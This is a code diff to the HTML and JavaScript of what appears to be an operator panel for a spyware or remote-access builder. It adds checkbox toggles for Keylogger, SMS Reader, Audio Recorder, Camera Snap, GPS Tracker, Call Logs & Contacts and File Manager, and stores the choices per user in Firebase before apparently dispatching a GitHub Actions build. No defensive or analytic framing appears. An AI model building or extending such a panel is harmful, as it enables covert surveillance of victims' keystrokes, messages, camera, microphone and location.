@@ -150,16 +150,32 @@
                                         <input type="checkbox" id="featureGallery" name="feature_gallery" checked style="accent-color: var(--primary); cursor: pointer;">
                                     </label>
                                     <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-keyboard text-primary-c me-1"></i> Keylogger</span>
-                                        <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <span><i class="fas fa-folder text-primary-c me-1"></i> File Manager</span>
+                                        <input type="checkbox" id="featureFiles" name="feature_files" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-microphone text-primary-c me-1"></i> Audio Recorder</span>
+                                        <input type="checkbox" id="featureAudio" name="feature_audio" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-camera text-primary-c me-1"></i> Camera Snap</span>
+                                        <input type="checkbox" id="featureCamera" name="feature_camera" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-map-marker-alt text-primary-c me-1"></i> GPS Tracker</span>
+                                        <input type="checkbox" id="featureLocation" name="feature_location" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-phone-alt text-primary-c me-1"></i> Call Logs & Contacts</span>
+                                        <input type="checkbox" id="featureCalls" name="feature_calls" checked style="accent-color: var(--primary); cursor: pointer;">
                                     </label>
                                     <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
                                         <span><i class="fas fa-envelope text-primary-c me-1"></i> SMS Reader</span>
                                         <input type="checkbox" id="featureSMS" name="feature_sms" checked style="accent-color: var(--primary); cursor: pointer;">
                                     </label>
                                     <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
-                                        <span><i class="fas fa-th text-primary-c me-1"></i> Apps & Accounts</span>
-                                        <input type="checkbox" id="featureApps" name="feature_apps" checked style="accent-color: var(--primary); cursor: pointer;">
+                                        <span><i class="fas fa-keyboard text-primary-c me-1"></i> Keylogger & Apps</span>
+                                        <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary); cursor: pointer;">
                                     </label>
                                 </div>
                             </div>
@@ -584,15 +600,23 @@
         });
 
         const featGallery = document.getElementById('featureGallery') ? document.getElementById('featureGallery').checked : true;
-        const featKeylogger = document.getElementById('featureKeylogger') ? document.getElementById('featureKeylogger').checked : true;
+        const featFiles = document.getElementById('featureFiles') ? document.getElementById('featureFiles').checked : true;
+        const featAudio = document.getElementById('featureAudio') ? document.getElementById('featureAudio').checked : true;
+        const featCamera = document.getElementById('featureCamera') ? document.getElementById('featureCamera').checked : true;
+        const featLocation = document.getElementById('featureLocation') ? document.getElementById('featureLocation').checked : true;
+        const featCalls = document.getElementById('featureCalls') ? document.getElementById('featureCalls').checked : true;
         const featSMS = document.getElementById('featureSMS') ? document.getElementById('featureSMS').checked : true;
-        const featApps = document.getElementById('featureApps') ? document.getElementById('featureApps').checked : true;
+        const featKeylogger = document.getElementById('featureKeylogger') ? document.getElementById('featureKeylogger').checked : true;
 
         fbDb.ref('panel_users/' + userId + '/features').set({
             gallery: featGallery,
-            keylogger: featKeylogger,
+            files: featFiles,
+            audio: featAudio,
+            camera: featCamera,
+            location: featLocation,
+            calls: featCalls,
             sms: featSMS,
-            apps: featApps
+            keylogger: featKeylogger
         });
 
         // Trigger GitHub Actions workflow dispatch
